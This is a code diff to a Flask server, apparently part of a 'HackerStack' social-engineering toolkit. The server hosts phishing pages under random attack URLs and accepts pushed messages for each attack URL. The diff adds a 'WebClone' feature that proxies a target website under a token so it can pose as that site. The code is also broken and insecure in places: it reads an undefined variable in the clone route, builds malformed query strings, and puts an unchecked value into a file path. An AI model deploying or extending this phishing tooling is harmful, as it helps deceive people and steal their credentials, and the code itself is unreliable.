@@ -10,6 +10,8 @@ from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
 import asyncio
 import mimetypes
+import threading
+import time
 from urllib.parse import unquote
 
 
@@ -20,14 +22,17 @@ import config_loader as config_loader
 app = Flask(__name__)
 CORS(app)
 
+
 url_list = {}
 config: config_loader = None
+visit_request = {}
 
 class user_sessen():
     username: str = ''
     url: str = ''
     attack_type: str = ''
     message: str ='none'
+    url_clone: str = ''
 
 def get_random() -> str:
     # 定义可用的字符集，包括26个英文字母（大小写）和数字
@@ -41,6 +46,16 @@ def get_random() -> str:
 
 @app.route('/push/<attack_url>/<message>')
 def get_message(attack_url,message):
+
+    # 限制每个IP对制定api的访问.
+    client_ip = request.remote_addr
+    if client_ip in visit_request:
+        visit_request[client_ip] = visit_request[client_ip] + 1
+        if visit_request[client_ip] >= 9:
+            return 'Too many requests'
+    else:
+        visit_request[client_ip] = 1
+
     if attack_url in url_list.keys():
         url_list.get(attack_url).message = unquote(message)
         return 'ok'
@@ -49,13 +64,17 @@ def get_message(attack_url,message):
         return 'your message error'
 
 
-@app.route('/<attack_url>')
+@app.route('/<path:attack_url>')
 def attack_url(attack_url):
     if attack_url in url_list.keys():
         u: user_sessen = url_list.get(attack_url)
         r = Response()
-        r.data = open('modules/socialEngine/'+u.attack_type+"/index.html").read()
-        return r
+        try:
+            r.data = open('modules/socialEngine/'+u.attack_type+"/index.html").read()
+            return r
+        except:
+            return 'the server error'
+                
     else:
         return 'your message error'
 
@@ -83,9 +102,60 @@ def get_resource(url):
     
     return r
 
+@app.route('/w/<attack_token>/<path:url>')
+def web_clone_url(attack_token,url):
+    if attack_token in url_list.keys():
+        u: user_sessen = url_list.get(attack_url)
 
-@app.route('/api/<attack_type>/<user>/<pwd>')
+        r = requests.get(u.url_clone+"/"+url)
+        return r.content
+    else:
+        return 'send message error'
+
+@app.route('/WebClone/<attack_url>/<user>/<pwd>')
+def WebClone(attack_url , user , pwd):
+    # 限制每个IP对制定api的访问.
+    client_ip = request.remote_addr
+    if client_ip in visit_request:
+        visit_request[client_ip] = visit_request[client_ip] + 1
+        if visit_request[client_ip] >= 6:
+            return 'Too many requests'
+    else:
+        visit_request[client_ip] = 1
+
+    md5_pwd = hashlib.md5(str(pwd).encode()).hexdigest()
+
+    r = requests.get(config.get('database_adress')+"/?Logon="+user+"?Passwd="+md5_pwd+"?Command=list database")
+    if r.text != 'Passwd Or UserName Error!':
+        n = get_random()
+        
+        u = user_sessen()
+        u.url = n
+        u.attack_type = 'webclone'
+        u.username = user
+        u.url_clone = attack_url
+
+        url_list[n] = u
+        return n
+
+    else:
+        return 'your message error' 
+
+
+@app.route('/api/<attack_type>/<user>/<pwd>/')
 def attack(attack_type,user,pwd):
+
+    # 限制每个IP对制定api的访问.
+    client_ip = request.remote_addr
+    if client_ip in visit_request:
+        visit_request[client_ip] = visit_request[client_ip] + 1
+        if visit_request[client_ip] >= 6:
+            return 'Too many requests'
+    else:
+        visit_request[client_ip] = 1
+    
+
+
     md5_pwd = hashlib.md5(str(pwd).encode()).hexdigest()
 
     r = requests.get(config.get('database_adress')+"/?Logon="+user+"?Passwd="+md5_pwd+"?Command=list database")
@@ -103,6 +173,17 @@ def attack(attack_type,user,pwd):
     else:
         return 'your message error'
 
+def visit_request_threading() -> None:
+    while True:
+        time.sleep(60) # 休息 60 秒
+        visit_request.clear()
+
 if __name__ == '__main__':
     config = config_loader.HackerStack_Config()
-    app.run(port=5555)
+
+    visit_request_thread = threading.Thread(target=visit_request_threading , name='visit_request')
+    visit_request_thread.start()
+
+    app.run(port=int(config.get(
+        'server_port'
+    )))
